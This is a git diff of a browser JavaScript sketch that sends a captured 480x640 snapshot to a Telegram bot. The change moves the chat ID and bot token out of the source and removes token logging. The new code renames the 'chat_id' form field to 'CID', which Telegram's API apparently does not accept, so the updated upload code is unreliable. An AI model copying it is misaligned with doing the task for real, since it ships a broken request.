@@ -3,8 +3,8 @@ let button;
 let img;
 let fit;
 
-const CHAT_ID = '-1002425906440';
-let env = undefined;
+let CID = undefined;
+let TBT = undefined;
 
 const imgSize = [480,640];
 const screenScale = 0.75;
@@ -55,11 +55,11 @@ async function fetchEnvVariables() {
     if (data.error) {
       console.error('Error:', data.error);
     } else {
-      env = data.tbt;
-      console.log('env set', env);
+      TBT = data.tbt;
+      CID = data.cid;
     }
   } catch (error) {
-    console.error('Error fetching secret:', error);
+    console.error('Error fetching:', error);
   }
 }
 
@@ -69,10 +69,9 @@ async function sendToTelegram(imageDataUrl) {
     .then(response => response.blob())
     .then(blob => {
       const formData = new FormData();
-      formData.append('chat_id', CHAT_ID);
+      formData.append('CID', CID);
       formData.append('photo', blob, 'snapshot.png');
-      console.log('env get',env);
-      fetch(`https://api.telegram.org/bot${env}/sendPhoto`, {
+      fetch(`https://api.telegram.org/bot${TBT}/sendPhoto`, {
         method: 'POST',
         body: formData
       })
